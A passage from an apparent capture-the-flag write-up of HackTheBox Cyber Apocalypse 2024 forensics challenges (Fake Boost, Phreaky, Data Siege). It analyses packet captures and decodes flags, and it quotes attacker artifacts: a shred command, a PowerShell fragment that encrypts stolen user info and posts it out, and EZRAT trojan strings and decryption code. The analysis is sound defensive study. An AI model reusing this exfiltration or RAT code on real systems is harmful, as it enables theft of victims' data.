+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ grep &#34;2024-02-19 04&#34; bash_history.txt 
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:18] whoami
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:20] uname -a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check bash_history at the same day and hour of suspicious login activity
+6. What is the final command the attacker executed before logging out</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ grep &#34;2024-02-19 04&#34; bash_history.txt 
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:18] whoami
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">[2024-02-19 04:12:02] shred -zu latest.tar.gz
+</span></span><span class="line"><span class="cl">[2024-02-19 04:14:02] ./setup
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the last command of the hour. If we review the bash_history directly, we can see the next command isn&rsquo;t logged for more than 24 hours later:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[2024-02-19 04:12:02] shred -zu latest.tar.gz
+</span></span><span class="line"><span class="cl">[2024-02-19 04:14:02] ./setup
+</span></span><span class="line"><span class="cl">[2024-02-20 11:11:14] nvim server.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="fake-boost">Fake Boost
+</h3><p>Difficulty: Easy</p>
+<blockquote>
+<p>In the shadow of The Fray, a new test called &ldquo;&ldquo;Fake Boost&rdquo;&rdquo; whispers promises of free Discord Nitro perks. It&rsquo;s a trap, set in a world where nothing comes without a cost. As factions clash and alliances shift, the truth behind Fake Boost could be the key to survival or downfall. Will your faction see through the deception? KORP™ challenges you to discern reality from illusion in this cunning trial.</p>
+</blockquote>
+<hr>
+<p>By sorting for <code>tcp</code>, we can quickly identify a GET request on a very suspicious /freediscordnitro:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/freenitro.png"
+	width="1057"
+	height="199"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/freenitro_hu5520954745352830580.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/freenitro_hu11613621300205976075.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="531"
+		data-flex-basis="1274px"
+	
+></p>
+<p>When we right click -&gt; follow http stream, we can view the request/response contents as a whole, and it contains a very large string of what appears to be base64 encoded characters:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/b64nitro.png"
+	width="1002"
+	height="544"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/b64nitro_hu8594346800957668994.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/b64nitro_hu11771034839254787318.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="184"
+		data-flex-basis="442px"
+	
+></p>
+<p>At the bottom, we can get hints as to the encoding method for this. First we see a Reverse, followed by convert from base64:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/revb64.png"
+	width="1013"
+	height="102"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/revb64_hu2799240969707310333.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/revb64_hu3278113996325568473.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="993"
+		data-flex-basis="2383px"
+	
+></p>
+<p>Using cyberchef, we can transform this query very easily:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/nitrocyberchef.png"
+	width="844"
+	height="693"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/nitrocyberchef_hu14588162267753357935.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/nitrocyberchef_hu14211637175097769338.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="292px"
+	
+></p>
+<p>Within the script, we can find a variable <code>part1</code> being defined without being used anywhere else:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/nitroflag1.png"
+	width="940"
+	height="280"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/nitroflag1_hu17096886887618641239.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/nitroflag1_hu3530939576147154896.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="335"
+		data-flex-basis="805px"
+	
+></p>
+<p>When we base64 decode this, we can see it is part of the flag:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf&#39; | base64 -d
+</span></span><span class="line"><span class="cl">HTB{fr33_N17r0G3n_3xp053d!_
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Back to wireshark, we can also see the data exfiltration event by filtering on <code>http</code>:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/nitrosteal.png"
+	width="1066"
+	height="145"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/nitrosteal_hu3735574587438749895.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/nitrosteal_hu8026831504565044711.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="735"
+		data-flex-basis="1764px"
+	
+></p>
+<p>We need to go back to the cyberchef decoded payload, but we can see clearly (with the AES key) how the data is transformed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span><span class="n">AES_KEY</span> <span class="o">=</span> <span class="s2">&#34;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">payload</span> <span class="o">=</span> <span class="o">$</span><span class="n">userInfos</span> <span class="o">|</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">Json</span> <span class="o">-</span><span class="n">Depth</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">encryptedData</span> <span class="o">=</span> <span class="n">Encrypt</span><span class="o">-</span><span class="ne">String</span> <span class="o">-</span><span class="n">key</span> <span class="o">$</span><span class="n">AES_KEY</span> <span class="o">-</span><span class="n">plaintext</span> <span class="o">$</span><span class="n">payload</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">headers</span> <span class="o">=</span> <span class="err">@</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;Content-Type&#39;</span> <span class="o">=</span> <span class="s1">&#39;text/plain&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span> <span class="o">=</span> <span class="s1">&#39;Mozilla/5.0&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Invoke</span><span class="o">-</span><span class="n">RestMethod</span> <span class="o">-</span><span class="n">Uri</span> <span class="o">$</span><span class="n">URL</span> <span class="o">-</span><span class="n">Method</span> <span class="n">Post</span> <span class="o">-</span><span class="n">Headers</span> <span class="o">$</span><span class="n">headers</span> <span class="o">-</span><span class="n">Body</span> <span class="o">$</span><span class="n">encryptedData</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here is the AES key hardcoded from the previous message. Now we can decode the exfiltrated data:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/nitroflag2.png"
+	width="834"
+	height="604"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/nitroflag2_hu7918141814608674658.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/nitroflag2_hu4547190845191165471.png 1024w"
+	loading="lazy"
+	
+		alt="The Initialization Vector (IV) is appended to the beginning of the message, highlighted in the red box. "
+	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="331px"
+	
+></p>
+<p>As for the IV, it is supplied at the beginning of the message encased in red box.
+Within the decoded JSON, we can see an email field strangely encoded. When we decode with base64, we see the 2nd part of the flag!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#39;YjNXNHIzXzBmX1QwMF9nMDBkXzJfYjNfN3J1M18wZmYzcjV9&#39; | base64 -d
+</span></span><span class="line"><span class="cl">b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The full flag:
+<code>HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}</code></p>
+<h3 id="phreaky">Phreaky
+</h3><p>Difficulty: Medium</p>
+<blockquote>
+<p>In the shadowed realm where the Phreaks hold sway,<br>
+A mole lurks within, leading them astray.<br>
+Sending keys to the Talents, so sly and so slick,<br>
+A network packet capture must reveal the trick.<br>
+Through data and bytes, the sleuth seeks the sign,<br>
+Decrypting messages, crossing the line.<br>
+The traitor unveiled, with nowhere to hide,<br>
+Betrayal confirmed, they&rsquo;d no longer abide.</p>
+</blockquote>
+<hr>
+<p>We are given a <code>pcap</code> file once again. This time there is no real interesting TCP requests, but we might quickly find unencrypted email transmissions:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/phreakyemail1.png"
+	width="1175"
+	height="256"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/phreakyemail1_hu8064188946993247487.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/phreakyemail1_hu17644550534691076441.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="458"
+		data-flex-basis="1101px"
+	
+></p>
+<p>When we follow the content, we can see a base64 encoded attachment. Here we might want to read the message before jumping straight into it:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/phreakyemail2.png"
+	width="603"
+	height="758"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/phreakyemail2_hu2940126161059908365.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/phreakyemail2_hu14263265549840032468.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="79"
+		data-flex-basis="190px"
+	
+></p>
+<p>It describes this attachment as &ldquo;part of the file&rdquo; and supplies a password as well. With a name like <code>efcfd.zip</code>, we can pretty easily guess the process: First we base64 decode, then unzip with the supplied password. There are several emails relevant to this challenge, so we can use &ldquo;Export Object&rdquo; to grab them all:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/exportobjects.png"
+	width="457"
+	height="490"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/exportobjects_hu13780831724842828545.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/exportobjects_hu4587718479838736940.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="93"
+		data-flex-basis="223px"
+	
+></p>
+<p>From here we see 15 different email messages:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/emails.png"
+	width="740"
+	height="531"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/emails_hu10477678015725991517.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/emails_hu16127587130741019833.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="334px"
+	
+></p>
+<p>After saving all, we need to extract the b64 and unzip using the password.</p>
+<p>eventually, we are left with 15 pdf part files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part10
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part11
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part12
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part13
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part14
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     208 Mar  6 09:59  phreaks_plan.pdf.part15
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part1
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part2
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part3
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part4
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part5
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part6
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part7
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part8
+</span></span><span class="line"><span class="cl">-rw-rw-r-- 1 spencer spencer     221 Mar  6 09:59  phreaks_plan.pdf.part9
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we need to reconstruct the pdf. Unfortunately, simply doing <code>cat phreaks_plan* &gt; plan.pdf</code> will append out of order, so I had to cat them one by one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat phreaks_plan.pdf.part0
+</span></span><span class="line"><span class="cl">cat phreaks_plan.pdf.part1 &gt; plan1.pdf
+</span></span><span class="line"><span class="cl">cat phreaks_plan.pdf.part2 &gt;&gt; plan1.pdf
+</span></span><span class="line"><span class="cl">cat phreaks_plan.pdf.part3 &gt;&gt; plan1.pdf
+</span></span><span class="line"><span class="cl">cat phreaks_plan.pdf.part4 &gt;&gt; plan1.pdf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And so on..
+Eventually we can view, the pdf, which contains the flag at the end:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/pdf.png"
+	width="986"
+	height="380"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/pdf_hu1543940365038264654.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/pdf_hu3384346805958203500.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="259"
+		data-flex-basis="622px"
+	
+></p>
+<p><code>HTB{Th3Phr3aksReadyT0Att4ck}</code></p>
+<h3 id="data-siege">Data Siege
+</h3><p>Difficulty: Medium</p>
+<blockquote>
+<p>&ldquo;It was a tranquil night in the Phreaks headquarters, when the entire district erupted in chaos. Unknown assailants, rumored to be a rogue foreign faction, have infiltrated the city&rsquo;s messaging system and critical infrastructure. Garbled transmissions crackle through the airwaves, spewing misinformation and disrupting communication channels. We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.&rdquo;</p>
+</blockquote>
+<hr>
+<p>Yet another pcap file. The first thing I come across is an interesting Invoke-WebRequest:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/dataIWR.png"
+	width="737"
+	height="355"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/dataIWR_hu17665733556939838524.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/dataIWR_hu11045494030624834142.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="498px"
+	
+></p>
+<p>This is part of the webpage response, however it looks to be contained in XML formatting. Perhaps it is something that was executed on our victim? If <code>aQ4caZ.exe</code> was indeed downloaded we should be able to export this object.</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/exeobject.png"
+	width="543"
+	height="188"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/exeobject_hu8271795257679969218.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/exeobject_hu9099144167307229410.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="693px"
+	
+></p>
+<p>We do see it here, and as a 29kb file it looks to be fully formed. We don&rsquo;t want to run random executables that we find, but we do need to analyze this. Firstly checking <code>strings</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">strings</span> <span class="n">aQ4caZ</span><span class="o">.</span><span class="n">exe</span> 
+</span></span><span class="line"><span class="cl"><span class="o">!</span><span class="n">This</span> <span class="n">program</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">run</span> <span class="ow">in</span> <span class="n">DOS</span> <span class="n">mode</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl"><span class="err">`</span><span class="o">.</span><span class="n">rsrc</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">EZRATClient</span>
+</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> 
+</span></span><span class="line"><span class="cl">  <span class="mi">2019</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="mi">2</span><span class="n">a079f4e</span><span class="o">-</span><span class="mi">4</span><span class="n">dcc</span><span class="o">-</span><span class="mi">44</span><span class="n">db</span><span class="o">-</span><span class="mi">8</span><span class="n">ca1</span><span class="o">-</span><span class="mi">0</span><span class="n">cf2c6a5f41d</span>
+</span></span><span class="line"><span class="cl"><span class="mf">0.1</span><span class="o">.</span><span class="mf">6.1</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">NETFramework</span><span class="p">,</span><span class="n">Version</span><span class="o">=</span><span class="n">v4</span><span class="o">.</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">FrameworkDisplayName</span>
+</span></span><span class="line"><span class="cl"><span class="o">.</span><span class="n">NET</span> <span class="n">Framework</span> <span class="mf">4.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">lSystem</span><span class="o">.</span><span class="n">Resources</span><span class="o">.</span><span class="n">ResourceReader</span><span class="p">,</span> <span class="n">mscorlib</span><span class="p">,</span> <span class="n">Version</span><span class="o">=</span><span class="mf">4.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">,</span> <span class="n">Culture</span><span class="o">=</span><span class="n">neutral</span><span class="p">,</span> <span class="n">PublicKeyToken</span><span class="o">=</span><span class="n">b77a5c561934e089</span><span class="c1">#System.Resources.RuntimeResourceSet</span>
+</span></span><span class="line"><span class="cl"><span class="n">PADPADP</span>
+</span></span><span class="line"><span class="cl"><span class="n">RSDS</span>
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">User</span>\<span class="n">Downloads</span>\<span class="n">EZRAT</span>\<span class="n">EZRATClient</span>\<span class="n">obj</span>\<span class="n">Debug</span>\<span class="n">EZRATClient</span><span class="o">.</span><span class="n">pdb</span>
+</span></span><span class="line"><span class="cl"><span class="n">_CorExeMain</span>
+</span></span><span class="line"><span class="cl"><span class="n">mscoree</span><span class="o">.</span><span class="n">dll</span>
+</span></span><span class="line"><span class="cl"><span class="n">Very_S3cr3t_S</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span> <span class="n">standalone</span><span class="o">=</span><span class="s2">&#34;yes&#34;</span><span class="err">?</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">assembly</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:asm.v1&#34;</span> <span class="n">manifestVersion</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">assemblyIdentity</span> <span class="n">version</span><span class="o">=</span><span class="s2">&#34;1.0.0.0&#34;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;MyApplication.app&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;</span><span class="n">trustInfo</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:asm.v2&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">security</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">&lt;</span><span class="n">requestedPrivileges</span> <span class="n">xmlns</span><span class="o">=</span><span class="s2">&#34;urn:schemas-microsoft-com:asm.v3&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">requestedExecutionLevel</span> <span class="n">level</span><span class="o">=</span><span class="s2">&#34;asInvoker&#34;</span> <span class="n">uiAccess</span><span class="o">=</span><span class="s2">&#34;false&#34;</span><span class="o">/&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">&lt;/</span><span class="n">requestedPrivileges</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">security</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">&lt;/</span><span class="n">trustInfo</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">assembly</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see this looks like a fully functioning executable, and I notice the phrase <code>EZRATClient</code> thrown around several times. We certainly don&rsquo;t want to be launching RATs onto our system! While I wasn&rsquo;t able to pull out a flag string directly, we can see in this snippet a <em>very</em> interesting string: <code>Very_S3cr3t_S</code>. This looks like a section of the flag, but it is clearly not in it&rsquo;s final form.</p>
+<p>With the executable file, I turn to dnSpy for further analysis. Within the <code>EZRATClient.Utils</code> contents, we can see a private encryption key:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/RATencryptKey.png"
+	width="843"
+	height="214"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/RATencryptKey_hu12453631282247572086.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/RATencryptKey_hu10221375527635240832.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="393"
+		data-flex-basis="945px"
+	
+></p>
+<p><code>VYAemVeO3zUDTL6N62kVA</code></p>
+<p>The next interesting piece is we can find a Decrypt function:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/decrypt.png"
+	width="953"
+	height="572"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/decrypt_hu43000210125059459.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/decrypt_hu9896650555238842868.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">public static string Decrypt(string cipherText)        
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    string text;
+</span></span><span class="line"><span class="cl">    try            
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">                string encryptKey = Constantes.EncryptKey;
+</span></span><span class="line"><span class="cl">                byte[] array = Convert.FromBase64String(cipherText);
+</span></span><span class="line"><span class="cl">                using (Aes aes = Aes.Create())
+</span></span><span class="line"><span class="cl">                {
+</span></span><span class="line"><span class="cl">                        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[]
+</span></span><span class="line"><span class="cl">                        {
+</span></span><span class="line"><span class="cl">                                86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83
+</span></span><span class="line"><span class="cl">                        });
+</span></span><span class="line"><span class="cl">                        aes.Key = rfc2898DeriveBytes.GetBytes(32);
+</span></span><span class="line"><span class="cl">                        aes.IV = rfc2898DeriveBytes.GetBytes(16);
+</span></span><span class="line"><span class="cl">                        using (MemoryStream memoryStream = new MemoryStream())
+</span></span><span class="line"><span class="cl">                        {
+</span></span><span class="line"><span class="cl">                                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
+</span></span><span class="line"><span class="cl">                                {
+</span></span><span class="line"><span class="cl">                                        cryptoStream.Write(array, 0, array.Length);
+</span></span><span class="line"><span class="cl">                                        cryptoStream.Close();
+</span></span><span class="line"><span class="cl">                                }
+</span></span><span class="line"><span class="cl">                                cipherText = Encoding.Default.GetString(memoryStream.ToArray());
+</span></span><span class="line"><span class="cl">                        }
+</span></span><span class="line"><span class="cl">                }
